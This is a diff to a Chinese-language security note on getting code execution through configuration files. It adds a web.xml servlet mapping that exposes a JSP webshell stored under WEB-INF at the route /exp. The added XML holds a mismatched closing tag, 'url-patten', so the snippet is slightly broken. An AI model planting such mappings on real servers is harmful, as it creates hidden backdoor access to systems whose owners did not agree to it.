@@ -207,11 +207,16 @@ https://mp.weixin.qq.com/s?__biz=MzU5MjEzOTM3NA==&mid=2247490570&idx=1&sn=279f4c
 
 不愧是师傅总结的不错，简单的说就是通过配置文件去rce.
 突然又想到了一个：web.xml里面添加servlet去实现解析一句话。
+访问/exp路由就会解析
 ```xml
 <servlet>
 <servlet-name>xxx</servlet-name>
 <jsp-file>/WEB-INF/1.jsp</jsp-file>
 </servlet>
+<servlet-mapping>
+<servlet-name>xxx</servlet-name>
+<url-pattern>/exp</url-patten>
+</servlet-mapping>
 ```
 
 
